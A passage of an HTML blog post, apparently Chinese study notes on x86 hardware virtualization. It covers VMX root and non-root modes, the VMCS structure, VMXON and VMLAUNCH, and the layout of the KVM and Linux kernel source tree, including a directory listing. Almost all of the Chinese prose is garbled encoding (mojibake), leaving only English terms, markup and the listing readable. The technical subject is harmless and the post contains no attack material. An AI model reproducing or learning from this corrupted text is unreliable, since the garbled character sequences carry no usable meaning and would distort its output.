æˆäº†x86è™šæ‹ŸåŒ–éš¾çš„é—®é¢˜</p><p>ä¸€äº›è™šæ‹ŸåŒ–æ–¹å¼</p><ul><li>Bochsä¸QEMUï¼ˆä¸å«KVMï¼‰ç±»çš„çº¯è½¯ä»¶æ¨¡æ‹Ÿä¸¥æ ¼æ¥è®²å¹¶ä¸ç®—æ˜¯è™šæ‹ŸåŒ–è½¯ä»¶ï¼Œåº”è¯¥å«ä½œæ¨¡æ‹Ÿå™¨ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ˜¯ä¸€æ¡ä¸€æ¡æŒ‡ä»¤åœ°è§£æï¼Œç„¶åæ‰§è¡Œçš„</li><li>VMWareæ—©æœŸçš„æ–¹æ¡ˆï¼Œè™šæ‹ŸåŒ–ç”¨æˆ·æ€çš„ç¨‹åºç›´æ¥åœ¨CPUä¸Šæ‰§è¡Œï¼Œä½†æ˜¯ä¸€äº›ç‰¹æƒæŒ‡ä»¤ä¼šé€šè¿‡åŠ¨æ€çš„äºŒè¿›åˆ¶ç¿»è¯‘å»æ‰§è¡Œ</li><li>Xenæ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆä¿®æ”¹äº†è™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿå†…æ ¸çš„ä»£ç ï¼Œä½¿è™šæ‹Ÿæœºå†…æ ¸è¿è¡Œåœ¨ring1ï¼Œå¹¶ä¸”å¯¹è™šæ‹Ÿæœºä¸­æ“ä½œç³»ç»Ÿå†…æ ¸çš„æ•æ„ŸæŒ‡ä»¤è¿›è¡Œæ›¿æ¢è¿›è€Œä½¿å…¶é™·å…¥åˆ°ring0çš„Xenå†…æ ¸</li><li>å„ä¸ªæ–¹æ¡ˆéƒ½æœ‰ç¼ºç‚¹ï¼Œå¦‚çº¯è½¯ä»¶æ¨¡æ‹Ÿçš„æ€§èƒ½éå¸¸å·®ï¼ŒXenæ–¹æ¡ˆåˆåªèƒ½æ”¯æŒæœ‰æºç çš„æ“ä½œç³»ç»Ÿï¼ŒVMwareçš„Workstationç»¼åˆæ¥çœ‹ç›¸å¯¹ä¸é”™ã€‚</li></ul><h3 id="4-1-2-VMXæ¶æ„ç®€ä»‹"><a href="#4-1-2-VMXæ¶æ„ç®€ä»‹" class="headerlink" title="4.1.2 VMXæ¶æ„ç®€ä»‹"></a>4.1.2 VMXæ¶æ„ç®€ä»‹</h3><p>CPUè™šæ‹ŸåŒ–çš„VT-xæŠ€æœ¯å¢åŠ VMXæ¶æ„æ¥å®ç°CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–</p><ul><li>è™šæ‹Ÿæœºç›‘æ§å™¨ï¼ˆVMMï¼‰ä»¥åŠè™šæ‹Ÿæœºï¼ˆVMï¼‰<ul><li>VMMå¯¹æ•´ä¸ªç³»ç»Ÿçš„CPUå’Œç¡¬ä»¶æœ‰å®Œå…¨çš„æ§åˆ¶æƒï¼Œå®ƒæŠ½è±¡å‡ºè™šæ‹Ÿçš„CPUç»™å„ä¸ªVMï¼Œå¹¶ä¸”èƒ½å¤Ÿå°†VMçš„CPUç›´æ¥è°ƒåº¦åˆ°ç‰©ç†CPUä¸Šè¿è¡Œã€‚VMMéœ€è¦å¯¹å„ä¸ªVMè¿›è¡Œç®¡ç†ï¼ŒåŒ…æ‹¬åˆ›å»ºã€é…ç½®ã€åˆ é™¤VMå®ä¾‹ã€ä¸ºå…¶åˆ†é…èµ„æºã€ç¡®ä¿å„ä¸ªVMä¹‹é—´çš„éš”ç¦»ä¸ç‹¬ç«‹ï¼Œè¿˜éœ€è¦å¤„ç†VMå¯¹èµ„æºçš„è®¿é—®ã€ç¡®ä¿å…¬å¹³ï¼Œæ‰€æœ‰è¿™äº›éƒ½éœ€è¦VMMè¿è¡Œçš„æƒé™é«˜äºVM</li><li>VMæœ¬èº«ä¸ä¼šæ„è¯†åˆ°å…¶å¤„åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ã€‚æ¯ä¸€ä¸ªVMéƒ½ç›¸äº’ç‹¬ç«‹ï¼Œæœ‰è‡ªå·±ç‹¬ç«‹çš„CPUã€å†…æ ¸ã€ä¸­æ–­å’Œè®¾å¤‡ç­‰ï¼Œè¿™äº›èµ„æºéƒ½æ˜¯VMMæä¾›çš„</li></ul></li><li>VMMæ‰§è¡Œçš„æ¨¡å¼å«ä½œVMX <strong>root</strong> operationæ¨¡å¼ï¼ŒVMæ‰§è¡Œçš„æ¨¡å¼å«ä½œVMX <strong>non-root</strong> operationæ¨¡å¼ï¼Œæ¯ç§æ¨¡å¼éƒ½æœ‰è‡ªå·±çš„ring0å’Œring3ç»“æ„ã€‚è¿™ä¸¤ç§æ¨¡å¼ä¹‹é—´çš„è½¬æ¢å«ä½œVMXè½¬æ¢ã€‚ä»VMX rootè½¬æ¢åˆ°VMX non-rootå«ä½œVM Entryï¼Œè€Œä»VMX non-rootè½¬æ¢åˆ°VMXrootåˆ™å«ä½œVM Exit</li><li>åœ¨VMX non-rootæ¨¡å¼ä¸­ï¼Œæ‰§è¡Œä¸€äº›ç‰¹æ®Šçš„æŒ‡ä»¤ï¼ˆå¦‚ä¹‹å‰æ‰€è¯´çš„å½±å“ç³»ç»Ÿå…¨å±€çš„æŒ‡ä»¤ï¼‰æˆ–è€…å‘ç”Ÿä¸€äº›ç‰¹æ®Šçš„äº‹ä»¶éƒ½ä¼šå¯¼è‡´VMExitï¼Œä½¿VMé€€å‡ºåˆ°VMM</li><li>VMX operationè®©è™šæ‹Ÿæœºçš„æ“ä½œç³»ç»Ÿä¸éœ€è¦ä¿®æ”¹å°±èƒ½å¤Ÿè¿è¡Œ</li></ul><p><img src="https://img.gls.show/img/20230810222845.png"></p><p><img src="https://img.gls.show/img/Pasted%20image%2020230801165150.png"><br><img src="https://img.gls.show/img/Pasted%20image%2020230801200334.png"><br><img src="https://img.gls.show/img/Pasted%20image%2020230801202743.png"><br>è¦è®©CPUè¿›å…¥VMX operationï¼Œé¦–å…ˆéœ€è¦æ‰§è¡Œä¸€ä¸ªVMXONçš„æŒ‡ä»¤ï¼Œå› ä¸ºVMMæœ¬èº«ä¹Ÿéœ€è¦è®°å½•ä¸€äº›æ•°æ®ï¼Œæ‰€ä»¥åœ¨æ‰§è¡ŒVMXONä¹‹å‰ï¼Œéœ€è¦å…ˆåˆ†é…ä¸€ä¸ªVMXONçš„åŒºåŸŸï¼Œå¹¶è¿›è¡Œåˆå§‹åŒ–ï¼ŒVMMå¯ä»¥é€šè¿‡æ‰§è¡ŒVMXOFFæŒ‡ä»¤é€€å‡ºVMX operationã€‚</p><p>æ¯ä¸€ä¸ªVMéƒ½ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„è™šæ‹Ÿæœºæ§åˆ¶ç»“æ„ï¼ˆVirtual Machine Control Structureï¼Œ<strong>VMCS</strong>ï¼‰åŒºåŸŸä¸ä¹‹å¯¹åº”ï¼Œç”¨æ¥ä¿å­˜è¯¥VMçš„ç›¸å…³ä¿¡æ¯ã€‚åœ¨è¿›è¡ŒVMLAUNCHä¹‹å‰éœ€è¦æå‰å¯¹VMCSè¿›è¡Œ<strong>åˆ†é…å¹¶åˆå§‹åŒ–</strong></p><p>VMMå¯ä»¥é€šè¿‡VM Entryä½¿ä¸€ä¸ªVMè¿›å…¥åˆ°è¿è¡ŒçŠ¶æ€ï¼Œé¦–æ¬¡è¿›å…¥VMæ˜¯é€šè¿‡æ‰§è¡ŒVMLAUNCHæŒ‡ä»¤å‘èµ·çš„</p><h3 id="4-1-3-VMCSä»‹ç»"><a href="#4-1-3-VMCSä»‹ç»" class="headerlink" title="4.1.3 VMCSä»‹ç»"></a>4.1.3 VMCSä»‹ç»</h3><p>æ¯ä¸ªè™šæ‹Ÿæœºçš„VCPUéƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„VMCS,VMCSåŒºåŸŸçš„å¤§å°ä¸º4KBï¼ŒVMMé€šè¿‡å®ƒçš„64ä½åœ°å€æ¥å¯¹è¯¥åŒºåŸŸè¿›è¡Œè®¿é—®ã€‚<strong>VMCSä¹‹äºVCPUçš„ä½œç”¨ç±»ä¼¼äºè¿›ç¨‹æè¿°ç¬¦ä¹‹äºè¿›ç¨‹çš„ä½œç”¨</strong>ã€‚ä¼ ç»Ÿä¸Šæ“ä½œç³»ç»Ÿçš„è¿›ç¨‹ä¼šå…±äº«ç‰©ç†CPUèµ„æºï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£åœ¨å¤šä¸ªè¿›ç¨‹ä¹‹é—´åˆ†é…CPUï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è¿›ç¨‹æè¿°ç¬¦æ¥ä¿å­˜è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨è¿›ç¨‹åˆ‡æ¢æ—¶ä¿å­˜ç¡¬ä»¶ä¸Šä¸‹æ–‡ï¼Œä½¿å¾—è¿›ç¨‹èƒ½å¤Ÿåœ¨ä¸‹æ¬¡è¢«è°ƒåº¦çš„æ—¶å€™æ­£å¸¸è¿è¡Œã€‚åŒæ ·ï¼ŒVCPUä¹‹é—´ä¼šå…±äº«ç‰©ç†CPUï¼ŒVMMè´Ÿè´£åœ¨å¤šä¸ªVCPUä¹‹é—´åˆ†é…ç‰©ç†CPUï¼Œæ¯ä¸ªVCPUéƒ½æœ‰è‡ªå·±çš„æè¿°ç¬¦ï¼Œå½“VMMåœ¨åˆ‡æ¢VCPUè¿è¡Œæ—¶éœ€è¦ä¿å­˜æ­¤åˆ»çš„VCPUçŠ¶æ€ï¼Œä»è€Œåœ¨ä¸‹æ¬¡çš„VCPUè°ƒåº¦ä¸­ä½¿å¾—VCPUèƒ½å¤Ÿä»è¢«ä¸­æ–­çš„é‚£ä¸ªç‚¹å¼€å§‹æ­£å¸¸è¿è¡Œã€‚</p><p>æ“ä½œVMCSçš„æŒ‡ä»¤åŒ…æ‹¬VMCLEARã€VMPTRLDã€VMREADå’ŒVMWRITE</p><p>VMCSçš„æ ¼å¼</p><ul><li>å‰8ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œæ¯”å¦‚æ ‡è¯†ä¸åŒvmcsç‰ˆæœ¬ä¿¡æ¯</li><li>å…¶ä½™ä¸ºVMCSæ•°æ®åŒºã€‚è¿™ä¸ªåŒºåŸŸçš„æ ¼å¼æ˜¯ç”±å®ç°å†³å®šçš„ï¼ŒVMMé€šè¿‡VMREADå’ŒMWRITEæŒ‡ä»¤åœ¨è¿™é‡Œè¯»å†™ï¼ˆä¹¦ä¸Šæœ‰å¯¹åº”çš„ä¿¡æ¯åŒºåŸŸå›¾ç¤ºï¼‰<ul><li>Guest-stateåŒºåŸŸï¼Œæœ‰å„ä¸ªå¯„å­˜å™¨çš„çŠ¶æ€ä»¥åŠä¸€äº›å¤„ç†å™¨çš„çŠ¶æ€ã€‚è¿›è¡ŒVM Entryæ—¶ï¼Œè™šæ‹Ÿæœºå¤„ç†å™¨çš„çŠ¶æ€ä¿¡æ¯ä»è¿™ä¸ªåŒºåŸŸåŠ è½½ï¼Œè¿›è¡ŒVM Exitæ—¶ï¼Œè™šæ‹Ÿæœºçš„å½“å‰çŠ¶æ€ä¿¡æ¯å†™å…¥åˆ°è¿™ä¸ªåŒºåŸŸã€‚</li><li>Host-stateåŒºåŸŸã€‚å½“å‘ç”ŸVM Exitçš„æ—¶å€™ï¼Œéœ€è¦åˆ‡æ¢åˆ°VMMçš„ä¸Šä¸‹æ–‡è¿è¡Œï¼Œæ­¤æ—¶å¤„ç†å™¨çš„çŠ¶æ€ä¿¡æ¯ä»è¿™ä¸ªåŒºåŸŸåŠ è½½</li><li>VM Exitæ§åˆ¶åŒºåŸŸã€‚è¿™ä¸ªåŒºåŸŸç”¨æ¥æŒ‡å®šè™šæ‹Ÿæœºåœ¨å‘ç”ŸVM Exitæ—¶çš„è¡Œä¸ºï¼Œå¦‚ä¸€äº›å¯„å­˜å™¨çš„ä¿å­˜ã€‚</li><li>VM Exitä¿¡æ¯åŒºåŸŸã€‚è¿™ä¸ªåŒºåŸŸåŒ…å«äº†æœ€è¿‘äº§ç”Ÿçš„VM Exitä¿¡æ¯ï¼Œå…¸å‹çš„ä¿¡æ¯åŒ…æ‹¬é€€å‡ºçš„åŸå› ä»¥åŠç›¸åº”çš„æ•°æ®ï¼Œå¦‚æŒ‡ä»¤æ‰§è¡Œçš„é€€å‡ºä¼šè®°å½•æŒ‡ä»¤çš„é•¿åº¦ç­‰ã€‚</li><li>VM Entryæ§åˆ¶åŒºåŸŸã€‚è¿™ä¸ªåŒºåŸŸç”¨æ¥æŒ‡å®šè™šæ‹Ÿæœºåœ¨å‘ç”ŸVM Entryæ—¶çš„è¡Œä¸ºï¼Œå¦‚ä¸€äº›å¯„å­˜å™¨çš„åŠ è½½ï¼Œè¿˜æœ‰ä¸€äº›è™šæ‹Ÿæœºçš„äº‹ä»¶æ³¨å…¥</li><li>VM-executionæ§åˆ¶åŒºåŸŸã€‚è¿™ä¸ªåŒºåŸŸç”¨æ¥æ§åˆ¶å¤„ç†å™¨åœ¨è¿›å…¥VM Entryä¹‹åçš„å¤„ç†å™¨è¡Œä¸ºï¼Œè¿™ä¸ªåŒºåŸŸå¾ˆåºå¤§ï¼ŒåŒ…å«äº†å¤šç§æ§åˆ¶ï¼Œå¦‚å“ªäº›æ—¶é—´ä¼šå¼•èµ·VM Exitï¼Œä¸€ä¸ªå¼‚å¸¸ä½å›¾æŒ‡ç¤ºå“ªäº›å¼‚å¸¸ä¼šå‘ç”ŸVM Exitï¼ŒAPICçš„è™šæ‹ŸåŒ–æ§åˆ¶ç­‰</li></ul></li></ul><h2 id="4-2-KVMæ¨¡å—åˆå§‹åŒ–ä»‹ç»"><a href="#4-2-KVMæ¨¡å—åˆå§‹åŒ–ä»‹ç»" class="headerlink" title="4.2 KVMæ¨¡å—åˆå§‹åŒ–ä»‹ç»"></a>4.2 KVMæ¨¡å—åˆå§‹åŒ–ä»‹ç»</h2><h3 id="4-2-1-KVMæºç ç»„ç»‡"><a href="#4-2-1-KVMæºç ç»„ç»‡" class="headerlink" title="4.2.1 KVMæºç ç»„ç»‡"></a>4.2.1 KVMæºç ç»„ç»‡</h3><p>KVM</p><ul><li>ä¸€ä¸ªç”¨äº Linux å†…æ ¸çš„è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆï¼Œå…è®¸åœ¨åŒä¸€ç¡¬ä»¶å¹³å°ä¸Šè¿è¡Œå¤šä¸ªè™šæ‹Ÿæœºï¼Œå……åˆ†åœ°é‡ç”¨äº†å†…æ ¸çš„è¯¸å¤šåŠŸèƒ½</li><li>ä»¥è‰²åˆ—åˆåˆ›å…¬å¸Qumranetåœ¨CPUæ¨å‡ºç¡¬ä»¶è™šæ‹ŸåŒ–ä¹‹åå¼€å‘çš„ä¸€ä¸ª<strong>åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºç›‘æ§å™¨</strong></li></ul><p>ä»£ç ç»“æ„</p><ul><li>kvmä¸»ä½“ä»£ç ä½äºå†…æ ¸æ ‘<strong>virt/kvmç›®å½•</strong>ä¸‹é¢ï¼Œè¡¨ç¤ºæ‰€æœ‰CPUæ¶æ„çš„<strong>å…¬å…±ä»£ç </strong>ï¼Œè¿™ä¹Ÿæ˜¯å†…æ ¸kvm.koå¯¹åº”çš„æºç </li><li>x86çš„æ¶æ„ç›¸å…³çš„ä»£ç åœ¨<strong>arch/x86/kvm</strong>ä¸‹ï¼ŒåŒä¸€ä¸ªæ¶æ„å¯èƒ½ä¼šæœ‰å¤šç§ä¸åŒçš„å®ç°ï¼Œvmx.cï¼ˆå¯¹åº”intel VM-Xæ–¹æ¡ˆï¼‰ï¼Œsvm.cï¼ˆå¯¹åº”AMD-Væ–¹æ¡ˆï¼‰ï¼Œè¿™ä¹Ÿæ˜¯intel-kvm.koå’Œamd-kvm.koçš„æ¥æº</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  arch<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  block<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  certs<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  crypto<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  Documentation<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  drivers<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  firmware<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  fs<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  include<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  init<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  ipc<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  kernel<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  lib<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  mm<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  net<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                î¬¯  samples<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  scripts<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  security<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  sound<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  tools<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  usr<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                ï“  virt<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>             <span class="hljs-number">31</span> ï…›  .get_maintainer.ignore<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">1280</span> îœ‚  .gitignore<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">5537</span> ï…›  .mailmap<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">18693</span> ï…›  COPYING<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">97181</span> ï…›  CREDITS<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">2622</span> ï…›  Kbuild<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>            <span class="hljs-number">252</span> ï…›  Kconfig<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>         <span class="hljs-number">337034</span> ï…›  MAINTAINERS<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">56302</span> ï…›  Makefile<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">18599</span> ó°ª·  README<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">7485</span> ï…›  REPORTING-BUGS<br></code></pre></td></tr></table></figure><ol><li><strong>archï¼š</strong> åŒ…å«ç‰¹å®šç¡¬ä»¶æ¶æ„çš„ä»£ç ï¼Œå¦‚x86ã€ARMã€MIPSç­‰ã€‚ä¸åŒçš„ç¡¬ä»¶æ¶æ„åœ¨è¿™ä¸ªç›®å½•ä¸‹æœ‰å„è‡ªçš„å­ç›®å½•ï¼ŒåŒ…å«äº†ä¸æ¶æ„ç›¸å…³çš„ä»£ç å’Œé…ç½®æ–‡ä»¶ã€‚</li><li><strong>blockï¼š</strong> åŒ…å«å—è®¾å¤‡å±‚çš„ä»£ç ï¼Œå¤„ç†å—è®¾å¤‡ï¼ˆç¡¬ç›˜ç­‰ï¼‰çš„I/Oæ“ä½œå’Œç®¡ç†ã€‚</li><li><strong>certsï¼š</strong> åŒ…å«ç”¨äºç­¾åLinuxå†…æ ¸ä»£ç çš„è¯ä¹¦æ–‡ä»¶ï¼Œç”¨äºç¡®ä¿ä»£ç çš„å¯ä¿¡åº¦å’Œå®Œæ•´æ€§ã€‚</li><li><strong>cryptoï¼š</strong> åŒ…å«åŠ å¯†ç›¸å…³çš„ä»£ç ï¼Œç”¨äºæä¾›Linuxå†…æ ¸ä¸­çš„åŠ å¯†å’Œå¯†ç å­¦åŠŸèƒ½ã€‚</li><li><strong>Documentationï¼š</strong> åŒ…å«Linuxå†…æ ¸çš„æ–‡æ¡£ï¼Œæä¾›å¼€å‘è€…å’Œç”¨æˆ·çš„è¯¦ç»†è¯´æ˜ã€ä½¿ç”¨æŒ‡å—å’Œæ–‡æ¡£ã€‚</li><li><strong>driversï¼š</strong> åŒ…å«å„ç§è®¾å¤‡é©±åŠ¨çš„ä»£ç ï¼Œæ¶µç›–äº†å¤šç§ç¡¬ä»¶è®¾å¤‡ï¼Œå¦‚ç½‘ç»œé€‚é…å™¨ã€æ˜¾å¡ã€å£°å¡ç­‰ã€‚<strong>å¯ä»¥å‘ç°é©±åŠ¨æ–‡ä»¶å¤¹å äº†æºç ä¸­ç»å¤§å¤šæ•°çš„ç©ºé—´</strong></li><li><strong>firmwareï¼š</strong> åŒ…å«ä¸€äº›ç¡¬ä»¶è®¾å¤‡çš„å›ºä»¶æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶åœ¨å¯åŠ¨æ—¶æˆ–è®¾å¤‡åˆå§‹åŒ–æ—¶å¯èƒ½ä¼šç”¨åˆ°ã€‚</li><li><strong>fsï¼š</strong> åŒ…å«æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„ä»£ç ï¼ŒåŒ…æ‹¬å„ç§æ–‡ä»¶ç³»ç»Ÿçš„å®ç°ï¼Œå¦‚EXT4ã€FATã€NTFSç­‰ã€‚</li><li><strong>includeï¼š</strong> åŒ…å«ç”¨äºç¼–è¯‘Linuxå†…æ ¸çš„å¤´æ–‡ä»¶ï¼Œè¿™äº›å¤´æ–‡ä»¶å®šä¹‰äº†å†…æ ¸ä¸­ä½¿ç”¨çš„ç»“æ„ä½“ã€å®ç­‰ã€‚</li><li><strong>initï¼š</strong> åŒ…å«ç³»ç»Ÿåˆå§‹åŒ–å’Œå¼•å¯¼è¿‡ç¨‹ç›¸å…³çš„ä»£ç ï¼ŒåŒ…æ‹¬å†…æ ¸åˆå§‹åŒ–å’Œå¯åŠ¨ã€‚</li><li><strong>ipcï¼š</strong> åŒ…å«è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰ç›¸å…³çš„ä»£ç ï¼Œç”¨äºå®ç°è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡å’ŒåŒæ­¥ã€‚</li><li><strong>kernelï¼š</strong> åŒ…å«æ ¸å¿ƒå†…æ ¸ä»£ç ï¼ŒåŒ…æ‹¬è°ƒåº¦å™¨ã€ä¸­æ–­å¤„ç†ã€ç³»ç»Ÿè°ƒç”¨ç­‰ã€‚</li><li><strong>libï¼š</strong> åŒ…å«ä¸€äº›é€šç”¨çš„åº“å‡½æ•°å’Œå·¥å…·å‡½æ•°ï¼Œç”¨äºå¸®åŠ©å†…æ ¸å¼€å‘ã€‚</li><li><strong>mmï¼š</strong> åŒ…å«å†…å­˜ç®¡ç†ç›¸å…³çš„ä»£ç ï¼Œç”¨äºç®¡ç†ç³»ç»Ÿçš„ç‰©ç†å†…å­˜å’Œè™šæ‹Ÿå†…å­˜ã€‚</li><li><strong>netï¼š</strong> åŒ…å«ç½‘ç»œåè®®æ ˆçš„ä»£ç ï¼Œç”¨äºå¤„ç†ç½‘ç»œæ•°æ®åŒ…çš„æ”¶å‘å’Œå¤„ç†ã€‚</li><li><strong>samplesï¼š</strong> åŒ…å«ç¤ºä¾‹ä»£ç ï¼Œç”¨äºæ¼”ç¤ºæŸäº›åŠŸèƒ½çš„ç”¨æ³•å’Œå®ç°ã€‚</li><li><strong>scriptsï¼š</strong> åŒ…å«ä¸€äº›ç”¨äºæ„å»ºå’Œé…ç½®å†…æ ¸çš„è„šæœ¬æ–‡ä»¶ã€‚</li><li><strong>securityï¼š</strong> åŒ…å«ä¸ç³»ç»Ÿå®‰å…¨æ€§ç›¸å…³çš„ä»£ç ï¼Œå¦‚è®¿é—®æ§åˆ¶ã€æƒé™ç®¡ç†ç­‰ã€‚</li><li><strong>soundï¼š</strong> åŒ…å«å£°éŸ³å­ç³»ç»Ÿçš„ä»£ç ï¼Œç”¨äºå¤„ç†å£°å¡å’ŒéŸ³é¢‘ç›¸å…³çš„åŠŸèƒ½ã€‚</li><li><strong>toolsï¼š</strong> åŒ…å«ä¸€äº›è¾…åŠ©å·¥å…·å’Œè°ƒè¯•å·¥å…·ï¼Œç”¨äºå†…æ ¸å¼€å‘å’Œè°ƒè¯•ã€‚</li><li><strong>usrï¼š</strong> åŒ…å«ç”¨æˆ·ç©ºé—´å·¥å…·å’Œåº”ç”¨ç¨‹åºçš„ä»£ç ï¼Œè¿™äº›å·¥å…·å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´ä½¿ç”¨ã€‚</li><li><strong>virtï¼š</strong> åŒ…å«è™šæ‹ŸåŒ–ç›¸å…³çš„ä»£ç ï¼Œç”¨äºæ”¯æŒè™šæ‹ŸåŒ–æŠ€æœ¯ã€‚</li><li><code>.gitignore</code>ã€<code>.mailmap</code>ã€<code>COPYING</code>ã€<code>CREDITS</code>ã€<code>Kconfig</code>ã€<code>MAINTAINERS</code>ã€<code>Makefile</code>ã€<code>README</code> 